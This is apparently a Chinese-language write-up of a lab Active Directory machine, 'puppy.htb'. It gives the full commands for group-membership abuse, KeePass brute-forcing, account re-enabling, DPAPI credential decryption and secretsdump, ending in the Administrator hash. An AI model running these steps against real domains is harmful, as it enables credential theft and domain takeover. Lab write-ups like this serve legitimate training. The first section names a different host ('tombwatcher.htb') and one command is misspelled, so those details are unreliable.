## 第一步：信息收集 — 端口扫描

### 使用工具

```bash
nmap -sC -sV -Pn -p- <target-ip>
```
### 目标主机信息

- **主机名称**: DC01.tombwatcher.htb
- **域**: tombwatcher.htb

-**存在典型域控（AD）服务**：LDAP、Kerberos、SMB、Global Catalog 等。

-**IIS (80端口)** 可作为潜在的外部攻击面（WEB 漏洞、登录页面、潜在 RCE）。

-**存在 WinRM（5985 端口）**，如果后续拿到有效凭据，可直接尝试远程命令执行。

![c2b3c2926b05ffa8637ff1da73ea24a](https://github.com/user-attachments/assets/0de03887-5263-42df-8867-0a5bc8d97373)

一看就知道是经典的域渗透， 直接上bloodhound 分析内网结构

### BLOOD HOUND
```bash
loodhound-python -u 'levi.james' -p 'KingoFAkron2025!' -d puppy.htb -dc dc.puppy.htb -c all -ns 10.10.11.70 --zip
```
![3694f18522bfbc84c5a94546026f1a3](https://github.com/user-attachments/assets/93751a5d-debd-4743-952c-070daba60aff)


Bloodhound 发现一开始题目给的james 账号密码 发现他是HR@PUPPY.HTB 同时对 Developer@PUPPY.HTB 有 generic write权限，正好在smb 服务里有 dev目录不能访问


## 第二步：获取dev 目录下敏感信息

先将 james 加入 Developer 组 然后 smb 尝试登录 访问dev 下目录
```bash
bloodyAD --host 10.10.11.70 -u 'levi.james' -p 'KingofAkron2025!' -d puppy.htb add groupMember developers levi.james
```

![0fd1426c5ba5b7c63c781f499f50f88](https://github.com/user-attachments/assets/5aad23e0-5a62-4437-9441-cc452bc3a00c)


然后讲密码本下载到本地 进行破解 得到密码 liverpool

```bash
./keepass4brute.sh recovery.kdbx /usr/share/wordlists/rockyou.txt
```
![23e422325d81393bcca4f8998dafe88](https://github.com/user-attachments/assets/431c08eb-9972-41bf-aee4-264265767141)

然后进入密码本 转换成xml 格式 搜索 存在的密码
![17ad2a2787560902150ce2860b6a8f9](https://github.com/user-attachments/assets/131a9820-c915-44c1-a8c0-b7c2847adcb7)

这里发现密码有以下几个 
JamieLove2025@
HJKL2025!
Antman2025！
Steve2025！
ILY2025!

集合BLOODHOUND 的内室图 攻击的起点明显是 EDWARDS, 手动尝试后 发现密码为 Antman2025！
![image](https://github.com/user-attachments/assets/f4125eb1-c468-47b0-a362-792acb4eb1b6)


## 第三步：横向移动
发现 edwards 拥有对 adam sikver generic all 权限 直接改密码
![image](https://github.com/user-attachments/assets/2794044f-f493-4656-8bd1-3d146a83f984)

![104a34a31906c2a56383e9a6a407b91](https://github.com/user-attachments/assets/befb95b6-1327-4884-91e0-e568c1df2dfc)
但是账号没有激活， 那就激活一下 adam silver

![deeac9813fb548a61ea2ff82aa3e12d](https://github.com/user-attachments/assets/170478a5-eeb7-49c8-9896-576c0cb724bb)

```bash
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.10.11.70 remove uac -f LOCKOUT -f ACCOUNTDISABLE adam.silver
bloodyAD -d puppy.htb -u ant.edwards -p 'Antman2025!' --host 10.10.11.70 get object adam.silver --attr userAccountControl

```
同时winrm 登录进 adam silver ，在backup目录 底下 发现  steven cooper的账号密码： steph.cooper ChefSteph2025!

同时开启 本地开启 smb share
随后上传 winpeas.exe 扫描
发现这两个敏感目录

![image](https://github.com/user-attachments/assets/5f7dc06c-2dd6-460b-a6a1-ffe72d5963ea)

![image](https://github.com/user-attachments/assets/9ab0b8f7-cce3-4b2e-8680-14312aed0583)

通过smb share 服务 讲这两个下载到本地 
![9005dd2ccf5da0210c66091be5a99ec](https://github.com/user-attachments/assets/3b85822b-77e9-4c01-9ec3-56a543621d28)
![6fec76e52f760cccdbe0ca187a3c0ef](https://github.com/user-attachments/assets/c20513cd-dcab-4748-a5fd-e5cea1a0c7cb)


随后把这两个文件进行破解
首先解密 master key

```bash
impacket-dpapi masterkey -file ./556a2412.masterkey -password 'ChefSteph2025!' -sid 'S-1-5-21-1487982659-1829050783-2281216199-1107'
```

在 Windows 中，很多敏感信息（如浏览器凭据、RDP 凭据、密码 vault 等）会用 DPAPI (Data Protection API) 加密，依赖 masterkey 文件来保护实际加密密钥（user key）。

流程：
1. 用户凭证派生出 masterkey 的保护密钥
2. 使用 masterkey 解密真正存储数据的 key（session key 或 DPAPI blob）

随后用key 解密 credential 文件

```bash
impacket-dpapi credential -f cred -key <decrypted key>
```

![eeabdf7971df489faf5bef6d737cf0c](https://github.com/user-attachments/assets/e46f0a1d-7ca7-4809-9613-d533641ec811)

![b33836a34b331d4fea0546f4c7d75cb](https://github.com/user-attachments/assets/805ed127-a588-4a82-9741-c67b7f5754b4)

这里直接拿到了另外一个账户的密码 steph.cooper_adm FivethChipOnItsWay2025! 

```bash
impacket-secretsdump 'puppy.htb/steph.cooper_adm':'FivethChipOnItsWay2025!'@10.10.11.70
```
最后一步 拿到 aministrator 的哈希 直接登录

![09d0a42d365a8bfe18b1d7295239169](https://github.com/user-attachments/assets/c83809a5-0017-4545-8982-2b5c91df8669)
